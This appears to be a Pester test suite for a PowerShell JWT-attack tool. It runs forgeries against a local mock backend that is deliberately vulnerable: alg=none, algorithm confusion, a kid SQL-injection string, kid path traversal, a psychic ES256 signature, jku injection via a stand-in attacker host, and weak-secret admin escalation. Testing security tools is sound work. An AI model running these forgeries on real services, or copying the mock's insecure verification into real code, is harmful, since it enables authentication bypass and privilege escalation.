#requires -Version 5.1
# Pester 5: Invoke-TcpkJwtAttack against a local HttpListener that enforces a DIFFERENT JWT
# verification policy per path. Proves the engine (a) detects real forgeries by protected-body
# comparison, (b) does NOT false-positive on a secure backend or a status-lying (200 + error
# body) backend, and (c) reaches the exploit tier with a recovered secret. HttpListener +
# HMAC/RSA are cross-platform. -DelayMs 0 removes the live-target throttle for the mock.

BeforeAll {
    $psd1 = Join-Path (Split-Path (Split-Path $PSCommandPath -Parent) -Parent) 'TCPK.psd1'
    Import-Module $psd1 -Force
    Enable-TcpkExploit -Acknowledge | Out-Null

    $script:rsa = [System.Security.Cryptography.RSA]::Create(2048)
    $script:pubPem = $script:rsa.ExportSubjectPublicKeyInfoPem()
    $script:serverEc = [System.Security.Cryptography.ECDsa]::Create([System.Security.Cryptography.ECCurve+NamedCurves]::nistP256)
    $ecp = $script:serverEc.ExportParameters($false)
    $script:qx = [Convert]::ToBase64String($ecp.Q.X); $script:qy = [Convert]::ToBase64String($ecp.Q.Y)
    $script:kidFile = Join-Path ([System.IO.Path]::GetTempPath()) ('tcpk-kidkey-' + [guid]::NewGuid().ToString('N').Substring(0, 8) + '.txt')
    [System.IO.File]::WriteAllText($script:kidFile, 'KIDKEYCONTENT-abc123')

    # original tokens each policy accepts (built with the module's own signer)
    $script:tok = & (Get-Module TCPK) {
        param($pubPem, $rsa, $ec)
        @{
            strict    = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u'; role = 'user' }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes('super-strict-secret-999'))
            liar      = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u' }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes('liarsecret'))
            noverify  = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u' }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes('whatever'))
            algnone   = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u' }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes('anon-gate-secret'))
            weak      = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u'; role = 'user' }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes('secret123'))
            confusion = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u' }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes($pubPem))
            kidsqli   = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT'; kid = 'key1' }) -Payload ([ordered]@{ sub = 'u' }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes('realsecret1'))
            expnone   = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u'; exp = 9999999999 }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes('expsecret123'))
            jwk       = New-TcpkJwtRs256Token -Header ([ordered]@{ alg = 'RS256'; typ = 'JWT'; jwk = (New-TcpkJwkFromRsa $rsa) }) -Payload ([ordered]@{ sub = 'u' }) -Rsa $rsa
            emptysig  = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u' }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes('emptysecret'))
            kidpath   = New-TcpkJwtToken -Header ([ordered]@{ alg = 'HS256'; typ = 'JWT'; kid = 'normalkid' }) -Payload ([ordered]@{ sub = 'u' }) -Alg 'HS256' -Key ([Text.Encoding]::UTF8.GetBytes('kidpathsecret'))
            espsychic = New-TcpkJwtEs256Token -Header ([ordered]@{ alg = 'ES256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u' }) -Ecdsa $ec -Alg 'ES256'
            jkuorig   = New-TcpkJwtRs256Token -Header ([ordered]@{ alg = 'RS256'; typ = 'JWT' }) -Payload ([ordered]@{ sub = 'u' }) -Rsa $rsa
        }
    } $script:pubPem $script:rsa $script:serverEc

    $l = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, 0); $l.Start()
    $script:port = ([System.Net.IPEndPoint]$l.LocalEndpoint).Port; $l.Stop()
    $script:base = "http://127.0.0.1:$($script:port)"

    # The mock backend simulates fetching the attacker's JWKS by reading the file the
    # cmdlet writes. It runs in Start-Job, a separate process with no TCPK module loaded,
    # so it cannot resolve that location itself -- the path is resolved HERE, where the
    # module is imported, and passed in. Previously the job hardcoded a %TEMP% path, which
    # silently stopped matching the moment the cmdlet's output location moved.
    $script:jkuArtifact = & (Get-Module TCPK) { Join-Path (Get-TcpkWorkDir -Kind 'run') 'jku-jwks.json' }

    $script:job = Start-Job -ArgumentList $script:port, $script:pubPem, $script:qx, $script:qy, $script:kidFile, $script:jkuArtifact -ScriptBlock {
        param($port, $pubPem, $qx, $qy, $kidFile, $jkuArtifact)
        function b64d($s) { $s = $s.Replace('-', '+').Replace('_', '/'); switch ($s.Length % 4) { 2 { $s += '==' } 3 { $s += '=' } }; try { [Convert]::FromBase64String($s) } catch { $null } }
        function hs($si, $kb) { $h = [Security.Cryptography.HMACSHA256]::new($kb); try { [Convert]::ToBase64String($h.ComputeHash([Text.Encoding]::ASCII.GetBytes($si))).TrimEnd('=').Replace('+', '-').Replace('/', '_') } finally { $h.Dispose() } }
        function parse($t) { $p = $t.Split('.'); if ($p.Count -lt 2) { return $null }; $h = $null; $pl = $null; try { $h = [Text.Encoding]::UTF8.GetString((b64d $p[0])) | ConvertFrom-Json } catch { return $null }; try { $pl = [Text.Encoding]::UTF8.GetString((b64d $p[1])) | ConvertFrom-Json } catch {}; @{ h = $h; p = $pl; parts = $p; si = ($p[0] + '.' + $p[1]) } }
        $ln = [System.Net.HttpListener]::new(); $ln.Prefixes.Add("http://127.0.0.1:$port/"); $ln.Start()
        try {
            while ($true) {
                $c = $ln.GetContext(); $path = $c.Request.Url.AbsolutePath
                $a = "$($c.Request.Headers['Authorization'])"
                $tok = if ($a -match '^Bearer (.+)$') { $Matches[1] } else { '' }
                $ok = $false; $body = 'DENIED'; $status = 401
                if ($tok) {
                    $j = parse $tok
                    switch -Wildcard ($path) {
                        '/strict'   { if ($j -and "$($j.h.alg)" -eq 'HS256' -and (hs $j.si ([Text.Encoding]::UTF8.GetBytes('super-strict-secret-999'))) -eq $j.parts[2]) { $ok = $true; $body = 'STRICT-PROTECTED' } }
                        '/status-liar' { if ($j -and "$($j.h.alg)" -eq 'HS256' -and (hs $j.si ([Text.Encoding]::UTF8.GetBytes('liarsecret'))) -eq $j.parts[2]) { $ok = $true; $body = 'LIAR-PROTECTED' } else { $status = 200; $body = 'LIAR-ERROR-invalid-token' } }
                        '/no-verify' { $ok = $true; $body = 'NOVERIFY-PROTECTED' }
                        '/alg-none'  { if ($j) { if ("$($j.h.alg)" -match '^(?i)none$') { $ok = $true; $body = 'ALGNONE-PROTECTED' } elseif ("$($j.h.alg)" -eq 'HS256' -and (hs $j.si ([Text.Encoding]::UTF8.GetBytes('anon-gate-secret'))) -eq $j.parts[2]) { $ok = $true; $body = 'ALGNONE-PROTECTED' } } }
                        '/weak'      { if ($j -and "$($j.h.alg)" -eq 'HS256' -and (hs $j.si ([Text.Encoding]::UTF8.GetBytes('secret123'))) -eq $j.parts[2]) { if ("$($j.p.role)" -eq 'admin') { $ok = $true; $body = 'WEAK-ADMIN-VIEW' } else { $ok = $true; $body = 'WEAK-PROTECTED' } } }
                        '/confusion' { if ($j -and "$($j.h.alg)" -eq 'HS256' -and (hs $j.si ([Text.Encoding]::UTF8.GetBytes($pubPem))) -eq $j.parts[2]) { $ok = $true; $body = 'CONFUSION-PROTECTED' } }
                        '/kid-sqli'  { if ($j) { $kid = "$($j.h.kid)"; $key = if ($kid -match "UNION SELECT 'k3y'") { 'k3y' } else { 'realsecret1' }; if ("$($j.h.alg)" -eq 'HS256' -and (hs $j.si ([Text.Encoding]::UTF8.GetBytes($key))) -eq $j.parts[2]) { $ok = $true; $body = 'KIDSQLI-PROTECTED' } } }
                        '/exp-none'  { if ($j -and "$($j.h.alg)" -eq 'HS256' -and (hs $j.si ([Text.Encoding]::UTF8.GetBytes('expsecret123'))) -eq $j.parts[2]) { $ok = $true; $body = 'EXP-PROTECTED' } }
                        '/jwk'       { if ($j -and $j.h.jwk -and "$($j.h.alg)" -eq 'RS256') { try { $rp = New-Object Security.Cryptography.RSAParameters; $rp.Modulus = b64d $j.h.jwk.n; $rp.Exponent = b64d $j.h.jwk.e; $r = [Security.Cryptography.RSA]::Create(); $r.ImportParameters($rp); if ($r.VerifyData([Text.Encoding]::ASCII.GetBytes($j.si), (b64d $j.parts[2]), [Security.Cryptography.HashAlgorithmName]::SHA256, [Security.Cryptography.RSASignaturePadding]::Pkcs1)) { $ok = $true; $body = 'JWK-PROTECTED' }; $r.Dispose() } catch {} } }
                        '/empty-sig' { if ($j -and "$($j.h.alg)" -eq 'HS256') { if ($j.parts[2] -eq '') { $ok = $true; $body = 'EMPTYSIG-PROTECTED' } elseif ((hs $j.si ([Text.Encoding]::UTF8.GetBytes('emptysecret'))) -eq $j.parts[2]) { $ok = $true; $body = 'EMPTYSIG-PROTECTED' } } }
                        '/kid-path'  { if ($j -and "$($j.h.alg)" -eq 'HS256') { $kid = "$($j.h.kid)"; $key = if ($kid -eq $kidFile) { [System.IO.File]::ReadAllBytes($kidFile) } elseif ($kid -eq 'normalkid') { [Text.Encoding]::UTF8.GetBytes('kidpathsecret') } else { $null }; if ($key -and (hs $j.si $key) -eq $j.parts[2]) { $ok = $true; $body = 'KIDPATH-PROTECTED' } } }
                        '/es-psychic' { if ($j -and "$($j.h.alg)" -eq 'ES256') { $sig = b64d $j.parts[2]; $nz = if ($sig) { @($sig | Where-Object { $_ -ne 0 }).Count } else { 1 }; if ($sig -and $sig.Length -gt 0 -and $nz -eq 0) { $ok = $true; $body = 'PSYCHIC-PROTECTED' } else { try { $ecp2 = [System.Security.Cryptography.ECParameters]::new(); $ecp2.Curve = [System.Security.Cryptography.ECCurve+NamedCurves]::nistP256; $pt = [System.Security.Cryptography.ECPoint]::new(); $pt.X = [Convert]::FromBase64String($qx); $pt.Y = [Convert]::FromBase64String($qy); $ecp2.Q = $pt; $ev = [System.Security.Cryptography.ECDsa]::Create(); $ev.ImportParameters($ecp2); if ($ev.VerifyData([Text.Encoding]::ASCII.GetBytes($j.si), $sig, [System.Security.Cryptography.HashAlgorithmName]::SHA256)) { $ok = $true; $body = 'PSYCHIC-PROTECTED' }; $ev.Dispose() } catch {} } } }
                        '/jku'       { if ($j -and "$($j.h.alg)" -eq 'RS256') { $acc = $false; if ($j.h.jku) { $jp = $jkuArtifact; if (Test-Path -LiteralPath $jp) { try { $jwks = Get-Content -LiteralPath $jp -Raw | ConvertFrom-Json; $k0 = $jwks.keys[0]; $rp2 = New-Object Security.Cryptography.RSAParameters; $rp2.Modulus = b64d $k0.n; $rp2.Exponent = b64d $k0.e; $rj = [Security.Cryptography.RSA]::Create(); $rj.ImportParameters($rp2); if ($rj.VerifyData([Text.Encoding]::ASCII.GetBytes($j.si), (b64d $j.parts[2]), [Security.Cryptography.HashAlgorithmName]::SHA256, [Security.Cryptography.RSASignaturePadding]::Pkcs1)) { $acc = $true }; $rj.Dispose() } catch {} } }; if (-not $acc) { try { $srv = [Security.Cryptography.RSA]::Create(); $srv.ImportFromPem($pubPem); if ($srv.VerifyData([Text.Encoding]::ASCII.GetBytes($j.si), (b64d $j.parts[2]), [Security.Cryptography.HashAlgorithmName]::SHA256, [Security.Cryptography.RSASignaturePadding]::Pkcs1)) { $acc = $true }; $srv.Dispose() } catch {} }; if ($acc) { $ok = $true; $body = 'JKU-PROTECTED' } } }
                    }
                }
                if ($ok) { $status = 200 }
                $c.Response.StatusCode = $status
                $b = [Text.Encoding]::UTF8.GetBytes($body); $c.Response.OutputStream.Write($b, 0, $b.Length); $c.Response.Close()
            }
        } finally { $ln.Stop() }
    }
    Start-Sleep -Seconds 2
}
AfterAll {
    try { Disable-TcpkExploit | Out-Null } catch {}
    if ($script:rsa) { $script:rsa.Dispose() }
    if ($script:serverEc) { $script:serverEc.Dispose() }
    if ($script:kidFile -and (Test-Path -LiteralPath $script:kidFile)) { Remove-Item -LiteralPath $script:kidFile -Force -ErrorAction SilentlyContinue }
    if ($script:job) { Stop-Job $script:job -EA SilentlyContinue; Remove-Job $script:job -Force -EA SilentlyContinue }
}

Describe 'Invoke-TcpkJwtAttack (active, gated)' {
    It 'does NOT false-positive on a secure backend (no-forgery-accepted, zero accepted findings)' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/strict" -Token $script:tok.strict -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object { $_.RuleId -like '*-accepted' -and $_.Confidence -like 'Confirmed*' }) | Should -BeNullOrEmpty
        ($f | Where-Object RuleId -eq 'jwt.no-forgery-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'does NOT false-positive on a status-lying backend (200 + error body)' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/status-liar" -Token $script:tok.liar -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object { $_.RuleId -like '*-accepted' -and $_.Confidence -like 'Confirmed*' }) | Should -BeNullOrEmpty
    }
    It 'flags signature-not-verified when the backend ignores the signature' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/no-verify" -Token $script:tok.noverify -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.signature-not-verified-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'confirms alg=none acceptance' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/alg-none" -Token $script:tok.algnone -Attacks none -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.alg-none-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'confirms RS256->HS256 algorithm confusion with the public key' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/confusion" -Token $script:tok.confusion -Attacks algconfusion -PublicKey $script:pubPem -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.alg-confusion-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'confirms kid SQL injection' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/kid-sqli" -Token $script:tok.kidsqli -Attacks kid-sqli -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.kid-sql-injection-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'confirms header jwk injection' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/jwk" -Token $script:tok.jwk -Attacks jwk -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.jwk-header-injection-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'confirms empty HS signature acceptance' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/empty-sig" -Token $script:tok.emptysig -Attacks empty-sig -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.empty-sig-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'confirms kid path-traversal against a known served file' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/kid-path" -Token $script:tok.kidpath -Attacks kid-path -KnownFileUrl $script:kidFile -KnownFileBytesPath $script:kidFile -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.kid-path-traversal-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'confirms ES psychic-signature acceptance (CVE-2022-21449)' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/es-psychic" -Token $script:tok.espsychic -Attacks es-psychic -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.psychic-signature-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'confirms jku header injection (backend fetches attacker JWKS)' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/jku" -Token $script:tok.jkuorig -Attacks jku -Jku 'http://attacker.test/jwks.json' -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.jku-header-injection-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'reaches exploit tier with a recovered secret and escalates privileges' {
        $crack = @(Invoke-TcpkJwtCrack -Token $script:tok.weak)
        ($crack | Where-Object RuleId -eq 'jwt.weak-secret') | Should -Not -BeNullOrEmpty
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/weak" -Token $script:tok.weak -Secret 'secret123' -EscalateClaims @{ role = 'admin' } -Attacks 'exp', 'nbf', 'escalate' -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        $forged = $f | Where-Object RuleId -eq 'jwt.weak-secret-forged-accepted'
        $forged | Should -Not -BeNullOrEmpty
        $forged.Confidence | Should -Be 'Confirmed (exploit)'
        ($f | Where-Object RuleId -eq 'jwt.privilege-escalation-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'confirms exp not enforced when the backend ignores expiry' {
        $f = @(Invoke-TcpkJwtAttack -Target "$($script:base)/exp-none" -Token $script:tok.expnone -Secret 'expsecret123' -Attacks 'exp', 'nbf' -ConfirmActive -DelayMs 0 -TimeoutSec 8)
        ($f | Where-Object RuleId -eq 'jwt.exp-not-enforced-accepted') | Should -Not -BeNullOrEmpty
    }
    It 'requires -ConfirmActive and the exploit gate' {
        { Invoke-TcpkJwtAttack -Target "$($script:base)/strict" -Token $script:tok.strict } | Should -Throw
        Disable-TcpkExploit | Out-Null
        { Invoke-TcpkJwtAttack -Target "$($script:base)/strict" -Token $script:tok.strict -ConfirmActive } | Should -Throw
        Enable-TcpkExploit -Acknowledge | Out-Null
    }
}
